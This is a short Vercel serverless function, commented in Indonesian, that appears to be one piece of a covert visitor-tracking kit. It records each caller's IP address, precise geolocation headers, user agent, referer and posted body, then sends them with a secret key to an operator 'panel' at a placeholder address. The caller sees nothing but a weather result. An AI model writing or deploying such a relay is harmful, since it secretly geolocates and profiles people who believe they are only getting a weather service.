// ===== GANTI 3 BARIS INI =====
const BACKEND_URL = "http://IP_PANEL:PORT";
const BACKEND_SECRET = "SECRET_RAHASIA_LU";
// ============================

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ ok: false });

  try {
    const xff = req.headers["x-forwarded-for"] || "";
    const ip = xff.split(",")[0].trim()
            || req.headers["x-real-ip"]
            || req.socket?.remoteAddress
            || "unknown";

    const country = req.headers["x-vercel-ip-country"] || "-";
    const countryRegion = req.headers["x-vercel-ip-country-region"] || "-";
    const city = decodeURIComponent(req.headers["x-vercel-ip-city"] || "-");
    const lat = req.headers["x-vercel-ip-latitude"] || "-";
    const lon = req.headers["x-vercel-ip-longitude"] || "-";
    const timezone = req.headers["x-vercel-ip-timezone"] || "-";
    const postalCode = req.headers["x-vercel-ip-postal-code"] || "-";

    const ua = req.headers["user-agent"] || "-";
    const acceptLang = req.headers["accept-language"] || "-";
    const referer = req.headers["referer"] || "-";
    const origin = req.headers["origin"] || "-";

    const body = req.body || {};

    const enriched = Object.assign({}, body, {
      server: {
        ip,
        geo: { country, region: countryRegion, city, lat, lon, timezone, postalCode },
        headers: { ua, acceptLang, referer, origin },
        receivedAt: new Date().toISOString(),
        vercelRegion: process.env.VERCEL_REGION || "-",
        vercelUrl: process.env.VERCEL_URL || "-"
      }
    });

    let backendData = { ok: true, weather: null };

    try {
      const r = await fetch(`${BACKEND_URL}/api/send`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Secret": BACKEND_SECRET,
          "X-Forwarded-From": "vercel"
        },
        body: JSON.stringify(enriched)
      });
      backendData = await r.json();
    } catch (e) {
      console.error("[Vercel] Panel unreachable:", e.message);
    }

    return res.status(200).json({ ok: true, weather: backendData.weather || null });

  } catch (err) {
    console.error("[Vercel] Error:", err.message);
    return res.status(200).json({ ok: true, weather: null });
  }
}